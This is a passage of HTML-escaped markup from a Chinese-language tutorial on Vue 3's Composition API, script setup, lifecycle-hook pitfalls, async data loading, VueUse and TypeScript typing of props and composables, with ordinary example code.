data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;//  选项API风格&lt;br/&gt;data: () =&amp;gt; ({&lt;br/&gt;    refA: 1,&lt;br/&gt;    refB: 2,&lt;br/&gt;  }),&lt;br/&gt;// 在这里，我们经常看到500行的代码。&lt;br/&gt;computed: {&lt;br/&gt;  &lt;span&gt;&lt;span&gt;computedA&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; this.refA + 10;&lt;br/&gt;  },&lt;br/&gt;  &lt;span&gt;&lt;span&gt;computedB&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; this.refA + 10;&lt;br/&gt;  },&lt;br/&gt;},&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有了Composition API，我们就不会受限于这种结构，可以根据功能而不是选项来分离代码。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;&lt;span&gt;setup&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;    const refA = ref(1);&lt;br/&gt;  const computedA = computed(() =&amp;gt; refA.value + 10);&lt;br/&gt;  /* &lt;br/&gt;  这里也可能是500行的代码。&lt;br/&gt;     但是，这些功能可以保持在彼此附近!&lt;br/&gt;  */&lt;br/&gt;    const computedB = computed(() =&amp;gt; refA.value + 10);&lt;br/&gt;  const refB = ref(2);&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; {&lt;br/&gt;      refA,&lt;br/&gt;      refB,&lt;br/&gt;      computedA,&lt;br/&gt;      computedB,&lt;br/&gt;    };&lt;br/&gt;  },&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Vue 3.2引入了&lt;code&gt;&amp;lt;script setup&amp;gt;&lt;/code&gt;语法，这只是&lt;code&gt;setup()&lt;/code&gt;函数的语法糖，使代码更加简洁。从现在开始，我们将使用 script setup  语法，因为它是最新的语法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import { ref, computed } from &lt;span&gt;&#x27;vue&#x27;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;const refA = ref(1);&lt;br/&gt;const computedA = computed(() =&amp;gt; refA.value + 10);&lt;br/&gt;&lt;br/&gt;const refB = ref(2);&lt;br/&gt;const computedB = computed(() =&amp;gt; refA.value + 10);&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在我看来，这是一个比较大想法。我们可以把这些功能分成自己的文件，而不是用通过放置 在script setup中的位置来保持它们的分离。下面是同样的逻辑，把文件分割开来的做法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;// Component.vue&lt;br/&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import useFeatureA from &lt;span&gt;&quot;./featureA&quot;&lt;/span&gt;;&lt;br/&gt;import useFeatureB from &lt;span&gt;&quot;./featureB&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;const { refA, computedA } = useFeatureA();&lt;br/&gt;const { refB, computedB } = useFeatureB();&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;// featureA.js &lt;br/&gt;import { ref, computed } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;export&lt;/span&gt; default &lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;/span&gt; () {&lt;br/&gt;  const refA = ref(1);&lt;br/&gt;  const computedA = computed(() =&amp;gt; refA.value + 10);&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; {&lt;br/&gt;    refA,&lt;br/&gt;    computedA,&lt;br/&gt;  };&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;// featureB.js &lt;br/&gt;import { ref, computed } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;export&lt;/span&gt; default &lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;/span&gt; () {&lt;br/&gt;  const refB = ref(2);&lt;br/&gt;  const computedB = computed(() =&amp;gt; refB.value + 10);&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; {&lt;br/&gt;    refB,&lt;br/&gt;    computedB,&lt;br/&gt;  };&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;注意，&lt;code&gt;featureA.js&lt;/code&gt;和&lt;code&gt;featureB.js&lt;/code&gt;导出了&lt;code&gt;Ref&lt;/code&gt;和&lt;code&gt;ComputedRef&lt;/code&gt;类型，因此所有这些数据都是响应式的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然而，这个特定的片段可能看起来有点矫枉过正。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;想象一下，这个组件有500多行代码，而不是10行。通过将逻辑分离&lt;code&gt;到use__.js&lt;/code&gt;文件中，代码变得更加可读。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;我们可以在多个组件中自由地重复使用&lt;code&gt;.js&lt;/code&gt;文件中的可组合函数 不再有无渲染组件与作用域槽的限制，也不再有混合函数的命名空间冲突。因为可组合函数直接使用了Vue的&lt;code&gt;ref&lt;/code&gt;和 &lt;code&gt;computed&lt;/code&gt;，所以这段代码可以与你项目中的任何&lt;code&gt;.vue&lt;/code&gt;组件一起使用。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;陷阱1：setup 中的生命周期钩子&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果生命周期钩子（&lt;code&gt;onMounted&lt;/code&gt;，&lt;code&gt;onUpdated&lt;/code&gt;等）可以在&lt;code&gt;setup&lt;/code&gt;里面使用，这也意味着我们也可以在我们的可组合函数里面使用它们。甚至可以这样写：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;// Component.vue&lt;br/&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import { useStore } from &lt;span&gt;&#x27;vuex&#x27;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;const store = useStore();&lt;br/&gt;store.dispatch(&lt;span&gt;&#x27;myAction&#x27;&lt;/span&gt;);&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;// store/actions.js&lt;br/&gt;import { onMounted } from &lt;span&gt;&#x27;vue&#x27;&lt;/span&gt;&lt;br/&gt;// ...&lt;br/&gt;actions: {&lt;br/&gt;  &lt;span&gt;&lt;span&gt;myAction&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;    onMounted(() =&amp;gt; {&lt;br/&gt;   console.log(&lt;span&gt;&#x27;its crazy, but this onMounted will be registered!&#x27;&lt;/span&gt;)&lt;br/&gt;  })&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;// ...&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;而且Vue甚至会在vuex内部注册生命周期钩子! (问题是：你应该🤨🙂)&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有了这种灵活性，了解如何以及何时注册这些钩子就很重要了。请看下面的片段。哪些&lt;code&gt;onUpdated&lt;/code&gt;钩子将被注册？&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup lang=&lt;span&gt;&quot;ts&quot;&lt;/span&gt;&amp;gt;&lt;br/&gt;import { ref, onUpdated } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;// 这个钩子将被注册。我们在 setup 中正常调用它&lt;br/&gt;onUpdated(() =&amp;gt; {&lt;br/&gt;  console.log(&lt;span&gt;&#x27;✅&#x27;&lt;/span&gt;)&lt;br/&gt;});&lt;br/&gt;&lt;br/&gt;class Foo {&lt;br/&gt;  &lt;span&gt;&lt;span&gt;constructor&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;    this.registerOnMounted();&lt;br/&gt;  }&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;registerOnMounted&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;     //它也会注册! 它是在一个类方法中，但它是在 &lt;br/&gt;     //在 setup 中同步执行&lt;br/&gt;    onUpdated(() =&amp;gt; { &lt;br/&gt;      console.log(&lt;span&gt;&#x27;✅&#x27;&lt;/span&gt;)&lt;br/&gt;    });&lt;br/&gt;  }&lt;br/&gt;}&lt;br/&gt;new Foo();&lt;br/&gt;&lt;br/&gt;// IIFE also works&lt;br/&gt;(&lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;/span&gt; () {&lt;br/&gt;  onUpdated(() =&amp;gt; {&lt;br/&gt;    state.value += &lt;span&gt;&quot;✅&quot;&lt;/span&gt;;&lt;br/&gt;  });&lt;br/&gt;})();&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;const onClick = () =&amp;gt; {&lt;br/&gt; /* &lt;br/&gt; 这不会被注册。这个钩子是在另一个函数里面。&lt;br/&gt; Vue不可能在setup 初始化中达到这个方法。&lt;br/&gt; 最糟糕的是，你甚至不会得到一个警告，除非这个 &lt;br/&gt; 函数被执行! 所以要注意这一点。&lt;br/&gt; */ &lt;br/&gt;  onUpdated(() =&amp;gt; {&lt;br/&gt;    console.log(&lt;span&gt;&#x27;❌&#x27;&lt;/span&gt;)&lt;br/&gt;  });&lt;br/&gt;};&lt;br/&gt;&lt;br/&gt;// 异步IIFE也会不行 :(&lt;br/&gt;(async &lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;/span&gt; () {&lt;br/&gt;  await Promise.resolve();&lt;br/&gt;  onUpdated(() =&amp;gt; {&lt;br/&gt;    state.value += &lt;span&gt;&quot;❌&quot;&lt;/span&gt;;&lt;br/&gt;  });&lt;br/&gt;})();&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;结论：在声明生命周期方法时，应使其在&lt;code&gt;setup&lt;/code&gt;初始化时同步执行。否则，它们在哪里被声明以及在什么情况下被声明并不重要。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;陷阱2：setup 中的异步函数&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们经常需要在我们的逻辑中使用&lt;code&gt;async/await&lt;/code&gt;。天真的做法是尝试这样做:&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup lang=&lt;span&gt;&quot;ts&quot;&lt;/span&gt;&amp;gt;&lt;br/&gt;import { myAsyncFunction } from &lt;span&gt;&#x27;./myAsyncFunction.js&lt;br/&gt;const data = await myAsyncFunction();&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  Async data: {{ data }}&lt;br/&gt;&amp;lt;/template&amp;gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然而，如果我们尝试运行这段代码，组件根本不会被渲染。为什么?因为 Promise 不跟踪状态。我们给 data  变量赋了一个 promise，但是Vue不会主动更新它的状态。幸运的是，有一些变通办法：&lt;/p&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;解决方案1：使用&lt;code&gt;.then&lt;/code&gt;语法的&lt;code&gt;ref&lt;/code&gt;&lt;/span&gt;&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;为了渲染该组件，我们可以使用&lt;code&gt;.then&lt;/code&gt;语法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import { ref } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;import { myAsyncFunction } from &lt;span&gt;&#x27;./myAsyncFunction.js&lt;br/&gt;&lt;br/&gt;const data = ref(null);&lt;br/&gt;myAsyncFunction().then((res) =&amp;gt;&lt;br/&gt;  data.value = fetchedData&lt;br/&gt;);&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  Async data: {{ data }}&lt;br/&gt;&amp;lt;/template&amp;gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;一开始时，创建一个等于null的响应式&lt;code&gt;ref&lt;/code&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;调用了异步函数script setup 的上下文是同步的，所以该组件会渲染&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;当&lt;code&gt;myAsyncFunction()&lt;/code&gt; promise 被解决时，它的结果被赋值给响应性 data ref，结果被渲染&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这种方式有自己优缺点：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;优点是：可以使用&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;缺点：语法有点过时，当有多个&lt;code&gt;.then&lt;/code&gt;和&lt;code&gt;.catch&lt;/code&gt;链时，会变得很笨拙。&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;解决方案2：IIFE&lt;/span&gt;&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果我们把这个逻辑包在一个异步IIFE里面，我们就可以使用 &lt;code&gt;async/await&lt;/code&gt;的语法。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import { ref } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;import { myAsyncFunction } from &lt;span&gt;&#x27;./myAsyncFunction.js&#x27;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;const data = ref(null);&lt;br/&gt;(async &lt;span&gt;&lt;span&gt;function&lt;/span&gt;&lt;/span&gt; () {&lt;br/&gt;    data.value = await myAsyncFunction()&lt;br/&gt;})();&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  Async data: {{ data }}&lt;br/&gt;&amp;lt;/template&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这种方式也有自己优缺点：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;优点：async/await语法&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;缺点：可以说看起来不那么干净，仍然需要一个额外的引用&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;解决方案3：Suspense （实验性的）&lt;/span&gt;&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果我们在父组件中用&lt;code&gt;&amp;lt;Suspense&amp;gt;&lt;/code&gt;包装这个组件，我们就可以自由在setup 中自由使用&lt;code&gt;async/await&lt;/code&gt;!&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;// Parent.vue&lt;/span&gt;&lt;br/&gt;&amp;lt;script setup lang=&lt;span&gt;&quot;ts&quot;&lt;/span&gt;&amp;gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; { Child } &lt;span&gt;from&lt;/span&gt; &lt;span&gt;&#x27;./Child.vue&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  &amp;lt;Suspense&amp;gt;&lt;br/&gt;  &amp;lt;Child /&amp;gt;&lt;br/&gt; &amp;lt;/Suspense&amp;gt;&lt;br/&gt;&amp;lt;/template&amp;gt;&lt;br/&gt;&lt;br/&gt;// Child.vue&lt;br/&gt;&amp;lt;script setup lang=&quot;ts&quot;&amp;gt;&lt;br/&gt;import { myAsyncFunction } from &#x27;&lt;/span&gt;./myAsyncFunction.js&lt;br/&gt;&lt;span&gt;const&lt;/span&gt; data = &lt;span&gt;await&lt;/span&gt; myAsyncFunction();&lt;br/&gt;&amp;lt;&lt;span&gt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  Async data: {{ data }}&lt;br/&gt;&amp;lt;/&lt;/span&gt;template&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;优点：到目前为止，最简明和直观的语法&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;缺点：截至2021年12月，这仍然是一个实验性的功能，它的语法可能会改变。&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;code&gt;&amp;lt;Suspense&amp;gt;&lt;/code&gt; 组件在子组件 setup 中有更多的可能性，而不仅仅是异步。使用它，我们还可以指定加载和回退状态。我认为这是创建异步组件的前进方向。Nuxt 3已经使用了这个特性，对我来说，一旦这个特性稳定下来，它可能是首选的方式&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;解决方案4：单独的第三方方法，为这些情况量身定做（见下节）。&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;优点。最灵活&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;缺点：对package.json的依赖&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;3. VueUse&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;VueUse库依靠Composition API解锁的新功能，给出了各种辅助函数。就像我们写的&lt;code&gt;useFeatureA&lt;/code&gt;和&lt;code&gt;useFeatureB&lt;/code&gt;一样，这个库可以让我们导入预制的实用函数，以可组合的风格编写。下面是它的工作原理的一个片段。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup lang=&lt;span&gt;&quot;ts&quot;&lt;/span&gt;&amp;gt;&lt;br/&gt;import {&lt;br/&gt;  useStorage,&lt;br/&gt; useDark&lt;br/&gt;} from &lt;span&gt;&quot;@vueuse/core&quot;&lt;/span&gt;;&lt;br/&gt;import { ref } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;/* &lt;br/&gt;    一个实现localStorage的例子。 &lt;br/&gt; 这个函数返回一个Ref，所以可以立即用`.value`语法来编辑它。&lt;br/&gt; 用.value语法编辑，而不需要单独的getItem/setItem方法。&lt;br/&gt;*/&lt;br/&gt;const localStorageData = useStorage(&lt;span&gt;&quot;foo&quot;&lt;/span&gt;, undefined);&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我无法向你推荐这个库，在我看来，它是任何新的Vue 3项目的必备品。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;这个库有可能为你节省很多行代码和大量的时间。&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;不影响包的大小&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;源代码很简单，容易理解。如果你发现该库的功能不够，你可以扩展该功能。这意味在选择使用这个库时，不会有太大的风险。&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;下面是这个库如何解决前面提到的异步调用执行问题。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup&amp;gt;&lt;br/&gt;import { useAsyncState } from &lt;span&gt;&quot;@vueuse/core&quot;&lt;/span&gt;;&lt;br/&gt;import { myAsyncFunction } from &lt;span&gt;&#x27;./myAsyncFunction.js&#x27;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;const { state, isReady } = useAsyncState(&lt;br/&gt; // the async &lt;span&gt;function&lt;/span&gt; we want to execute&lt;br/&gt;  myAsyncFunction,&lt;br/&gt;&lt;br/&gt;  // Default state:&lt;br/&gt;  &lt;span&gt;&quot;Loading...&quot;&lt;/span&gt;,&lt;br/&gt;&lt;br/&gt;  // UseAsyncState options:&lt;br/&gt;  {&lt;br/&gt;    onError: (e) =&amp;gt; {&lt;br/&gt;      console.error(&lt;span&gt;&quot;Error!&quot;&lt;/span&gt;, e);&lt;br/&gt;      state.value = &lt;span&gt;&quot;fallback&quot;&lt;/span&gt;;&lt;br/&gt;    },&lt;br/&gt;  }&lt;br/&gt;);&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;template&amp;gt;&lt;br/&gt;  useAsyncState: {{ state }}&lt;br/&gt;  Is the data ready: {{ isReady }}&lt;br/&gt;&amp;lt;/template&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这种方法可以让你在&lt;code&gt;setup&lt;/code&gt;里面执行异步函数，并给你回退选项和加载状态。现在，这是我处理异步的首选方法。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4. 如果你的项目使用Typescript&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;新的&lt;code&gt;defineProps&lt;/code&gt;和&lt;code&gt;defineEmits&lt;/code&gt;语法&lt;/span&gt;&lt;span/&gt;&lt;/h4&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;script setup  带来了一种在Vue组件中输入 props 和 emits 的更快方式。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&amp;lt;script setup lang=&lt;span&gt;&quot;ts&quot;&lt;/span&gt;&amp;gt;&lt;br/&gt;import { PropType } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;interface CustomPropType {&lt;br/&gt;  bar: string;&lt;br/&gt;  baz: number;&lt;br/&gt;}&lt;br/&gt;//  defineProps的重载。&lt;br/&gt;// 1. 类似于选项API的语法&lt;br/&gt;defineProps({&lt;br/&gt;  foo: {&lt;br/&gt;    &lt;span&gt;type&lt;/span&gt;: Object as PropType&amp;lt;CustomPropType&amp;gt;,&lt;br/&gt;    required: &lt;span&gt;false&lt;/span&gt;,&lt;br/&gt;    default: () =&amp;gt; ({&lt;br/&gt;      bar: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;      baz: 0,&lt;br/&gt;    }),&lt;br/&gt;  },&lt;br/&gt;});&lt;br/&gt;&lt;br/&gt;// 2. 通过一个泛型。注意，不需要PropType!&lt;br/&gt;defineProps&amp;lt;{ foo: CustomPropType }&amp;gt;();&lt;br/&gt;&lt;br/&gt;// 3.默认状态可以这样做。&lt;br/&gt;withDefaults(&lt;br/&gt;  defineProps&amp;lt;{&lt;br/&gt;    foo: CustomPropType;&lt;br/&gt;  }&amp;gt;(),&lt;br/&gt;  {&lt;br/&gt;    foo: () =&amp;gt; ({&lt;br/&gt;      bar: &lt;span&gt;&quot;&quot;&lt;/span&gt;,&lt;br/&gt;      baz: 0,&lt;br/&gt;    }),&lt;br/&gt;  }&lt;br/&gt;);&lt;br/&gt;&lt;br/&gt;// // Emits也可以用defineEmits进行简单的类型化&lt;br/&gt;defineEmits&amp;lt;{ (foo: &lt;span&gt;&quot;foo&quot;&lt;/span&gt;): string }&amp;gt;();&lt;br/&gt;&amp;lt;/script&amp;gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;就个人而言，我会选择通用风格，因为它为我们节省了一个额外的导入，并且对null和 undefined  的类型更加明确，而不是Vue 2风格语法中的&lt;code&gt;{ required: false }&lt;/code&gt;。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;💡 注意，不需要手动导入 &lt;code&gt;defineProps&lt;/code&gt; 和 &lt;code&gt;defineEmits&lt;/code&gt;。这是因为这些是Vue使用的特殊宏。这些在编译时被处理成 &quot;正常 的选项API语法。我们可能会在未来的&lt;code&gt;Vue版本&lt;/code&gt;中看到越来越多的宏的实现。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;可组合函数的类型化&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;因为typescript要求默认输入模块的返回值，所以一开始我主要是用这种方式写TS组合物。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;import { ref, Ref, SetupContext, watch } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;export&lt;/span&gt; default &lt;span&gt;function&lt;/span&gt; ({&lt;br/&gt;  emit,&lt;br/&gt;}: SetupContext&amp;lt;(&lt;span&gt;&quot;change-component&quot;&lt;/span&gt; | &lt;span&gt;&quot;close&quot;&lt;/span&gt;)[]&amp;gt;): &lt;br/&gt;// 下面的代码真的有必要吗？&lt;br/&gt;{&lt;br/&gt;  onCloseStructureDetails: () =&amp;gt; void;&lt;br/&gt;  showTimeSlots: Ref&amp;lt;boolean&amp;gt;;&lt;br/&gt;  showStructureDetails: Ref&amp;lt;boolean&amp;gt;;&lt;br/&gt;  onSelectSlot: (arg1: onSelectSlotArgs) =&amp;gt; void;&lt;br/&gt;  onBackButtonClick: () =&amp;gt; void;&lt;br/&gt;  showMobileStepsLayout: Ref&amp;lt;boolean&amp;gt;;&lt;br/&gt;  authStepsComponent: Ref&amp;lt;string&amp;gt;;&lt;br/&gt;  isMobile: Ref&amp;lt;boolean&amp;gt;;&lt;br/&gt;  selectedTimeSlot: Ref&amp;lt;null | TimeSlot&amp;gt;;&lt;br/&gt;  showQuestionarireLink: Ref&amp;lt;boolean&amp;gt;;&lt;br/&gt;} {&lt;br/&gt;  const isMobile = useBreakpoints().smaller(&lt;span&gt;&quot;md&quot;&lt;/span&gt;);&lt;br/&gt;  const store = useStore();&lt;br/&gt; // and so on, and so on&lt;br/&gt; // ... &lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这种方式，我认为这是个错误。其实没有必要对函数返回进行类型化，因为在编写可组合的时候可以很容易地对它进行隐式类型化。它可以为我们节省大量的时间和代码行。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;import { ref, Ref, SetupContext, watch } from &lt;span&gt;&quot;vue&quot;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;export&lt;/span&gt; default &lt;span&gt;function&lt;/span&gt; ({&lt;br/&gt;  emit,&lt;br/&gt;}: SetupContext&amp;lt;(&lt;span&gt;&quot;change-component&quot;&lt;/span&gt; | &lt;span&gt;&quot;close&quot;&lt;/span&gt;)[]&amp;gt;) {&lt;br/&gt;  const isMobile = useBreakpoints().smaller(&lt;span&gt;&quot;md&quot;&lt;/span&gt;);&lt;br/&gt;  const store = useStore();&lt;br/&gt; // The &lt;span&gt;return&lt;/span&gt; can be typed implicitly 